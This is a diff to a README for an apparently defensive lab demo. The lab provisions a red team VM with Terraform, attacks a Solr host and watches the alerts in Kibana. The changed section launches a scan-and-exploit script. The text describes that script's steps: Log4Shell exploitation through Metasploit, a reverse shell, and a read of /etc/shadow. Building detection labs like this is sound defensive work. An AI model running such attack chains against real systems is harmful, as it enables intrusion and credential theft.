@@ -53,30 +53,20 @@ terraform output -raw kibana_endpoint
 
 ## Running the Demo
 
-### 1. SSH into the red team VM
+### 1. Launch the attack
+
+From the `terraform/` directory — SSHs into the red team VM and exploits solr-kb:
 
 ```bash
-# Terraform gives you the exact command:
-$(cd terraform && terraform output -raw ssh_command_redteam)
-
-# Or manually:
-ssh -i state/ssh-key.pem ubuntu@$(cd terraform && terraform output -raw redteam_public_ip)
-```
-
-### 2. Run the attack
-
-From the red team VM:
-
-```bash
-# Full recon + exploit (scans subnet, finds Solr, exploits Log4Shell)
-./scripts/host-scan.sh -s 10.0.1.0/24 -a $(hostname -I | awk '{print $1}')
+$(terraform output -raw ssh_command_redteam) -t \
+  "./scripts/host-scan.sh -t $(terraform output -json host_private_ips | jq -r '.["solr-kb"]') -a \$(hostname -I | awk '{print \$1}')"
 ```
 
 The script runs through: nmap discovery, Solr version fingerprinting, Log4Shell confirmation, Metasploit exploitation, and reverse shell.
 
 You'll be dropped into an interactive Metasploit session on the victim.
 
-### 3. Observe in Kibana
+### 2. Observe in Kibana
 
 - **Security → Alerts** — Defend alerts appear for the reverse shell, `/etc/shadow` read, etc.
 - **Stack Management → Workflows** — The alert-triage workflow triggers automatically:
